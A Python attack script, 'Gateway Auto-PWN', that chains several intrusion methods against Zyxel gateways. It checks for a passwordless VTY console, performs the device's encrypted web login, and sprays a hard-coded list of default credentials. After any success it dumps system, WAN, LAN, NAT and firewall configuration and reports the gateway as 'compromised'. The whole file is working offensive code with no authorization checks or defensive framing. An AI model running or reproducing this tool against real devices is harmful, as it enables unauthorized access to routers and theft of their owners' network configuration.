"""
Gateway Auto-PWN - Orchestrates multiple attack vectors against Zyxel gateways.
Chains VTY, web crypto, default creds, and config dump into one sweep.
"""
import requests
import json
import base64
import os
import socket
import time
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


def _generate_keys():
    aes_key = os.urandom(32)
    iv = os.urandom(32)
    return base64.b64encode(aes_key).decode(), base64.b64encode(iv).decode()


def _aes_cbc_encrypt(plaintext, aes_key_b64, iv_b64):
    key = base64.b64decode(aes_key_b64)
    iv = base64.b64decode(iv_b64)[:16]
    if isinstance(plaintext, str):
        plaintext = plaintext.encode('utf-8')
    block_size = 16
    pad_len = block_size - (len(plaintext) % block_size)
    padded = plaintext + bytes([pad_len] * pad_len)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    return base64.b64encode(ciphertext).decode()


def _rsa_encrypt_string(plain_string, rsa_pubkey_pem):
    data_bytes = plain_string.encode('utf-8')
    public_key = serialization.load_pem_public_key(rsa_pubkey_pem.encode(), backend=default_backend())
    ciphertext = public_key.encrypt(data_bytes, padding.PKCS1v15())
    return base64.b64encode(ciphertext).decode()


def _try_vty(target, port=2601, timeout=5):
    """Try passwordless VTY console access."""
    results = {"method": "VTY (passwordless)", "success": False, "detail": ""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        time.sleep(0.5)
        banner = s.recv(4096).decode('utf-8', errors='replace')
        s.close()
        if "password is not set" in banner.lower():
            results["success"] = True
            results["detail"] = f"Banner: {banner.strip()}"
            results["access"] = "passwordless"
        else:
            results["detail"] = f"Banner: {banner.strip()[:200]}"
    except Exception as e:
        results["detail"] = f"Error: {e}"
    return results


def _try_web_crypto(target, username, password, port=80, use_https=False, timeout=15):
    """Try the AES+RSA crypto login via /UserLogin."""
    results = {"method": "Web Crypto (AES+RSA)", "success": False, "detail": ""}
    protocol = "https" if use_https else "http"
    base_url = f"{protocol}://{target}:{port}"
    session = requests.Session()
    session.verify = False
    
    try:
        resp = session.get(f"{base_url}/getRSAPublickKey", timeout=timeout)
        if resp.status_code != 200:
            results["detail"] = f"HTTP {resp.status_code} getting RSA key"
            return results
        data = resp.json()
        rsa_key = data.get("RSAPublicKey", "").replace('\\/', '/')
        if not rsa_key or rsa_key == "None":
            results["detail"] = f"No RSA key: {data}"
            return results
    except Exception as e:
        results["detail"] = f"RSA key error: {e}"
        return results
    
    aes_key_b64, iv_b64 = _generate_keys()
    login_payload = {"username": username, "password": password, "language": "en"}
    login_json = json.dumps(login_payload, separators=(',', ':'))
    
    try:
        encrypted_content = _aes_cbc_encrypt(login_json, aes_key_b64, iv_b64)
        encrypted_key = _rsa_encrypt_string(aes_key_b64, rsa_key)
    except Exception as e:
        results["detail"] = f"Encryption error: {e}"
        return results
    
    try:
        resp = session.post(
            f"{base_url}/UserLogin",
            json={"content": encrypted_content, "key": encrypted_key, "iv": iv_b64},
            timeout=timeout,
            headers={"Content-Type": "application/json",
                     "If-Modified-Since": "Thu, 01 Jun 1970 00:00:00 GMT"}
        )
        if resp.status_code == 200:
            try:
                resp_data = resp.json()
                if resp_data.get("result") == "ZCFG_SUCCESS":
                    results["success"] = True
                    results["detail"] = "Login ZCFG_SUCCESS"
                    results["cookies"] = dict(session.cookies)
                    # Try to fetch config
                    try:
                        info = session.get(f"{base_url}/getBasicInformation", timeout=timeout)
                        results["gateway_info"] = info.text[:300] if info.status_code == 200 else ""
                    except:
                        pass
                else:
                    results["detail"] = f"Result: {resp_data}"
            except json.JSONDecodeError:
                results["detail"] = f"Non-JSON response: {resp.text[:200]}"
        else:
            results["detail"] = f"HTTP {resp.status_code}"
    except Exception as e:
        results["detail"] = f"POST error: {e}"
    
    return results


def _try_default_creds(target, port=80, use_https=False, timeout=10):
    """Try common default credentials against various endpoints."""
    results = {"method": "Default Credentials", "success": False, "detail": ""}
    protocol = "https" if use_https else "http"
    base_url = f"{protocol}://{target}:{port}"
    session = requests.Session()
    session.verify = False
    
    creds = [
        ("admin", "admin"),
        ("admin", "1234"),
        ("admin", "password"),
        ("admin", "zyxel"),
        ("admin", "Zyxel"),
        ("admin", ""),
        ("admin", "admin1234"),
        ("admin", "Admin"),
        ("admin", "123456"),
        ("root", "root"),
        ("root", "admin"),
        ("user", "user"),
    ]
    
    endpoints = [
        "/cgi-bin/login",
        "/UserLogin",
    ]
    
    for user, pwd in creds:
        for ep in endpoints:
            try:
                if "UserLogin" in ep:
                    # Try simple form login
                    resp = session.post(f"{base_url}{ep}", 
                        data={"username": user, "password": pwd}, timeout=timeout)
                else:
                    resp = session.post(f"{base_url}{ep}",
                        data={"username": user, "password": pwd}, timeout=timeout)
                
                if resp.status_code == 200:
                    txt = resp.text.lower()
                    if any(ind in txt for ind in ["success", "dashboard", "logout", "welcome", "main"]):
                        results["success"] = True
                        results["detail"] = f"{user}:{pwd} on {ep}"
                        return results
                    # Check if response has session cookie
                    if session.cookies:
                        results["success"] = True
                        results["detail"] = f"{user}:{pwd} on {ep} (cookies: {dict(session.cookies)})"
                        return results
            except:
                continue
    
    results["detail"] = "No default creds worked"
    return results


def gateway_auto_pwn(target: str, username: str = "admin", password: str = "admin",
                     port: int = 80, use_https: bool = False, vty_port: int = 2601,
                     timeout: int = 15) -> str:
    """
    Orchestrate multiple attack vectors against a Zyxel gateway.
    
    Tests:
    1. VTY passwordless console
    2. Web AES+RSA crypto login
    3. Default credentials
    4. Config dump (if auth'd)
    
    Args:
        target: IP address of target gateway
        username: Login username (default: admin)
        password: Password to try (default: admin)
        port: Web port (default: 80)
        use_https: Use HTTPS (default: False)
        vty_port: VTY console port (default: 2601)
        timeout: Request timeout
        
    Returns:
        Consolidated attack results
    """
    report = []
    report.append("=" * 60)
    report.append("ZYXEL GATEWAY AUTO-PWN")
    report.append(f"Target: {target}")
    report.append(f"Time: {time.ctime()}")
    report.append("=" * 60)
    
    # Phase 1: VTY Check
    report.append("\n[PHASE 1] VTY Console Check")
    report.append("-" * 40)
    vty_result = _try_vty(target, vty_port, timeout)
    report.append(f"Result: {'SUCCESS' if vty_result['success'] else 'FAILED'}")
    report.append(f"Detail: {vty_result['detail']}")
    if vty_result.get("access"):
        report.append(f"Access: {vty_result['access']}")
    
    # Phase 2: Web Crypto Login
    report.append("\n[PHASE 2] Web Crypto Login (AES+RSA)")
    report.append("-" * 40)
    crypto_result = _try_web_crypto(target, username, password, port, use_https, timeout)
    report.append(f"Result: {'SUCCESS' if crypto_result['success'] else 'FAILED'}")
    report.append(f"Detail: {crypto_result['detail']}")
    if crypto_result.get("gateway_info"):
        report.append(f"Gateway Info: {crypto_result['gateway_info']}")
    
    # Phase 3: Default Credentials
    report.append("\n[PHASE 3] Default Credentials")
    report.append("-" * 40)
    default_result = _try_default_creds(target, port, use_https, timeout)
    report.append(f"Result: {'SUCCESS' if default_result['success'] else 'FAILED'}")
    report.append(f"Detail: {default_result['detail']}")
    
    # Phase 4: If any auth succeeded, try config dump
    auth_success = vty_result['success'] or crypto_result['success'] or default_result['success']
    
    if auth_success:
        report.append("\n[PHASE 4] Configuration Dump")
        report.append("-" * 40)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, vty_port))
            time.sleep(0.5)
            s.recv(4096)
            s.send(b"sys info\r\n")
            time.sleep(0.5)
            resp1 = s.recv(4096).decode('utf-8', errors='replace')
            s.send(b"wan info\r\n")
            time.sleep(0.5)
            resp2 = s.recv(4096).decode('utf-8', errors='replace')
            s.close()
            report.append("VTY Commands Executed:")
            report.append(f"sys info: {resp1[:300]}")
            report.append(f"wan info: {resp2[:300]}")
        except Exception as e:
            report.append(f"VTY config dump failed: {e}")
        
        # Try web config dump if we have cookies
        if crypto_result.get("cookies") or default_result.get("cookies"):
            session = requests.Session()
            session.verify = False
            if crypto_result.get("cookies"):
                session.cookies.update(crypto_result["cookies"])
            elif default_result.get("cookies"):
                session.cookies.update(default_result["cookies"])
            
            for oid in ["wan_service", "lan", "sys_info", "nat", "firewall"]:
                try:
                    resp = session.get(f"http://{target}:{port}/cgi-bin/DAL?oid={oid}", timeout=timeout)
                    if resp.status_code == 200:
                        report.append(f"\n--- {oid.upper()} Config ---")
                        try:
                            j = resp.json()
                            report.append(json.dumps(j, indent=2)[:500])
                        except:
                            report.append(resp.text[:500])
                except:
                    pass
    
    # Summary
    report.append("\n" + "=" * 60)
    report.append("ATTACK SUMMARY")
    report.append("=" * 60)
    successes = []
    if vty_result['success']: successes.append("VTY passwordless")
    if crypto_result['success']: successes.append("Web Crypto login")
    if default_result['success']: successes.append("Default credentials")
    
    if successes:
        report.append(f"SUCCESS: {' + '.join(successes)}")
        report.append("Gateway compromised.")
    else:
        report.append("FAILED: No access gained. Gateway may be secure.")
        report.append("Suggestions: Try different username/password combo, check for other ports, or firmware exploit.")
    
    return "\n".join(report)
